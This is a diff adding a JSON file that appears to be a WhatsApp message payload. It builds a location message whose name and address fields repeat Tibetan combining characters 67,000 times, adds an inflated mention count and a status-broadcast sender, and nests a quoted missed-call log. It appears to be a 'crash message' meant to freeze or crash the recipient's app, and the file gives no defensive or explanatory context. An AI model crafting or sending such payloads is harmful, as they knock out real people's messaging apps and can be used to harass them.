@@ -1,0 +1,23 @@
+{
+  "locationMessage": {
+    "degreesLatitude": 0,
+    "degreesLongitude": 0,
+    "name": "$repeat(ྫྷྃ,67000)",
+    "address": "$repeat(ྫྷྃ,67000)",
+    "jpegThumbnail": "",
+    "contextInfo": {
+      "nonJidMentions": 9999,
+      "remoteJid": "status@broadcast",
+      "participant": "13135550002@s.whatsapp.net",
+      "stanzaId": "666",
+      "quotedMessage": {
+        "callLogMesssage": {
+          "isVideo": true,
+          "callOutcome": "MISSED",
+          "durationSecs": "0",
+          "callType": "REGULAR"
+        }
+      }
+    }
+  }
+}
